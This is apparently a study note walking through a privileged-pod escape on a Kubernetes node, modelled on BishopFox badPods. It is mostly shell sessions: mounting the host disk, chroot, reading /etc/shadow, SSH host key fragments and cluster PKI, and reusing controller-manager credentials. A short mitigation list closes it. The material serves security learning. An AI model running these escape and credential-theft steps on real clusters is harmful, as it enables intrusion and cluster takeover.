# First What a Hacker Would Do

TODO: picture with possible attacks.


## Getting Unauthorized Shell to the Node

https://github.com/BishopFox/badPods/

### 1. pod privileged

```
localhost$ kubectl apply -f ./pod-privileged.yaml
localhost$ kubectl exec -it pod-privileged -- bash
```

Can read all node's devices:
- lsblk
- ls /dev
- fdisk -l
- ...

```
root@pod-privileged:/# mount /dev/sda1 /mnt

root@pod-privileged:/# chroot /mnt

sh-4.2# bash
```

Basically, now kubectl already works:
```
[root@pod-privileged /artem]# kubectl config view
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: DATA+OMITTED
    server: https://188.2***4:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: kubernetes-admin
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
preferences: {}
users:
- name: kubernetes-admin
  user:
    client-certificate-data: REDACTED
    client-key-data: REDACTED
```

Node's users:
```
[root@pod-privileged /]# cat /etc/shadow
root:$6$auLWtuo4$P5KzOLLAYk2LuEk7CAjs0mVURNXFV***fApzm58Htlgg.bLH0g.3U0guXE/Gj6Q7faQJf0:18907:0:99999:7:::
bin:*:17110:0:99999:7:::
...
```

Ansible config:
```
[root@pod-privileged /]# cat /srv/southbridge/etc/sb-iptables-base.conf
# THIS FILE IS MANAGED BY ANSIBLE, ALL CHANGES WILL BE LOST

# zabbix.southbridge.ru
136.24...
```

Users' data:
```
[root@pod-privileged /]# tree /home -a
/home
├── a.likha****v
│   ├── .bash_logout
│   ├── .bash_profile
│   ├── .bashrc
│   └── .ssh
│       └── authorized_keys
├── a.mukhame***v
│   ├── .bash_logout
...
```

SSH config?
```
[root@pod-privileged /]# cat /etc/ssh/ssh_host_ed25519_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAKmjHIiX0dEjs7ycmfA9b3EK/w/GNkBcjFLJBWx0AOuwAAAJB9zPzZfcz8
...

[root@pod-privileged /]# cat /etc/ssh/sshd_config
###################################
# sshd config from southbridge.io #
###################################

AddressFamily inet
...

HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
...
```

Can't read processes:
```
[root@pod-privileged /]# ps aux
Error, do this: mount -t proc proc /proc

[root@pod-privileged /]# ls /proc
total 8
drwxr-xr-x   2 root root 4096 Sep 12  2017 ./
drwxr-xr-x. 18 root root 4096 Oct  7 11:09 ../
```

K8s calico config and cert:
```
[root@pod-privileged /]# cat /etc/cni/net.d/10-calico.conflist
{
  "name": "k8s-pod-network",
  "cniVersion": "0.3.1",
  "plugins": [
    {
      "type": "calico",
      "log_level": "info",
...

[root@pod-privileged /]# cat /etc/cni/net.d/calico-kubeconfig
# Kubeconfig file for Calico CNI plugin.
apiVersion: v1
kind: Config
clusters:
- name: local
  cluster:
    server: https://[10.96***.1]:443
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJeE1UQXdOekUwTVRVek5Gb1hEVE14TVRBd05URTBNVFV6TkZvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTWdiCmNzenNEakdFT29FR0J4TUVVeTdwQ2dSeUhNUjRBRjVraUdPVGN6V1dXdlpsalNjeE9sNTdOZForcTlnR05paGsKMjRnYVNObkVpaGhRUXBPS0N1blY0UDBGV2RvbzNRMTBRaW1wU0piR0FNSzVIY0lvc0NlRTFDUm1FQzM4WmtrMgpSL2dINWtLNHVlaStkaDRYUGkrQnd0bEVlbElxOU55UTViTDZaYUhQMHhTbGdVZlRselQzMG9GaFBLdFUrSHdLCnJIa3Rva0s4NGxPWXhtRndVYXZuckJVTkNUbGlMSEVSRWFveU9TNGJ5WTRkRTh3SUgvQ1R5R0xLM1VPNllNUGoKeFRoM1ZZWmdtY05TZWFBZmQySHBMT1NpVUE1bkZUQ3FrRm5QL1dNa3drWXNLaGtVbkpCckg5bUxEMmVIU0x2WQpyK2MyQVVJdTl0Q2ZKS3ZxaFJVQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjB...
...
```

K8s node's config:
```
[root@pod-privileged /]# tree /etc/kubernetes/
/etc/kubernetes/
├── admin.conf
├── controller-manager.conf
├── kubelet.conf
├── manifests
│   ├── etcd.yaml
│   ├── kube-apiserver.yaml
│   ├── kube-controller-manager.yaml
│   └── kube-scheduler.yaml
├── pki
│   ├── apiserver.crt
│   ├── apiserver-etcd-client.crt
│   ├── apiserver-etcd-client.key
│   ├── apiserver.key
│   ├── apiserver-kubelet-client.crt
│   ├── apiserver-kubelet-client.key
│   ├── ca.crt
│   ├── ca.key
│   ├── etcd
│   │   ├── ca.crt
│   │   ├── ca.key
│   │   ├── healthcheck-client.crt
│   │   ├── healthcheck-client.key
│   │   ├── peer.crt
│   │   ├── peer.key
│   │   ├── server.crt
│   │   └── server.key
│   ├── front-proxy-ca.crt
│   ├── front-proxy-ca.key
│   ├── front-proxy-client.crt
│   ├── front-proxy-client.key
│   ├── sa.key
│   └── sa.pub
└── scheduler.conf
```

And `/etc/kubernetes/admin.conf` contains admin's cluster configuration.

Or as `kube-controller-manager`:
```
[root@pod-privileged /artem]# cp /etc/kubernetes/controller-manager.conf .kube/conf
[root@pod-privileged /artem]# export KUBECONFIG=`pwd`/.kube/conf
[root@pod-privileged /artem]# kubectl config view
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: DATA+OMITTED
    server: https://188.2***:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: system:kube-controller-manager
  name: system:kube-controller-manager@kubernetes
current-context: system:kube-controller-manager@kubernetes
kind: Config
preferences: {}
users:
- name: system:kube-controller-manager
  user:
    client-certificate-data: REDACTED
    client-key-data: REDACTED
```

Network:
```
[root@pod-privileged /artem]# ifconfig
Warning: cannot open /proc/net/dev (No such file or directory). Limited output.
Warning: cannot open /proc/net/dev (No such file or directory). Limited output.
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1480
        inet 10.244*** netmask 255.255.255.255  broadcast 10.244.***
        ether 96:1e:9a:***  txqueuelen 0  (Ethernet)

Warning: cannot open /proc/net/dev (No such file or directory). Limited output.
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)



[root@pod-privileged /artem]# cat /etc/networks
default 0.0.0.0
loopback 127.0.0.0
link-local 169.254.0.0
```

Sudoers is writeable!
```
[root@pod-privileged /artem]# echo "  " >> /etc/sudoers
```

Yum doesn't work -- wrong command?
```
[root@pod-privileged /artem]# yum install docker
error: Failed to initialize NSS library
There was a problem importing one of the Python modules
required to run yum. The error leading to this problem was:

   cannot import name ts

Please install a package which provides this module, or
verify that the module is installed correctly.

It's possible that the above module doesn't match the
current version of Python, which is:
2.7.5 (default, Nov 16 2020, 22:23:17)
[GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]

If you cannot solve this problem yourself, please go to
the yum faq at:
  http://yum.baseurl.org/wiki/Faq
```


### 2. pod hostpid
### 3. pod hostpath
### 4. pod hostipc
### 5. pod hostnetwork

(+root в контейнере)



Note: Luksa plugin https://github.com/luksa/kubectl-plugins/blob/master/kubectl-ssh


## Mitigation
1. PSP (deprecated)
2. Admission Controllers
